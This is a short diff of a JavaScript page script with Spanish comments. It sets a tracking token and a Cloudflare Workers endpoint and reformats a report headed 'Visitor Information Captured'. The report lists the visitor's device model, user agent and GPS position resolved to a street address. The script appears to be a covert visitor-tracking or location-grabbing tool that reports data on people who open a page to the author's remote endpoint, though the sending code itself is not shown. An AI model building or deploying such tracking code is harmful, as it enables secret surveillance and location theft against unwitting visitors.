@@ -18,7 +18,7 @@
         // CONFIGURACIÓN
         // ============================================================
         const trackingId = 'AQUI_VA_TOKEN';  // 🔥 CAMBIA ESTO POR TU TOKEN REAL
-        const workerUrl = 'https://wispy-bonus-51e9.societykark.workers.dev'; // 🔥 TU WORKER
+        const workerUrl = 'https://wispy-bonus-51e9.societykark.workers.dev';
 
         console.log('✅ Script iniciado');
 
@@ -198,7 +198,10 @@
                     gpsConDireccion = { ...gps, direccion };
                 }
 
-                let msg = '🖥️ Device & Browser\n';
+                let msg = '📊 Visitor Information Captured\n';
+                msg += '━━━━━━━━━━━━━━━━\n\n';
+
+                msg += '🖥️ Device & Browser\n';
                 msg += `   • Device Model: ${dispositivo.modelo}\n`;
                 msg += `   • User Agent: ${dispositivo.userAgent}\n\n`;
 
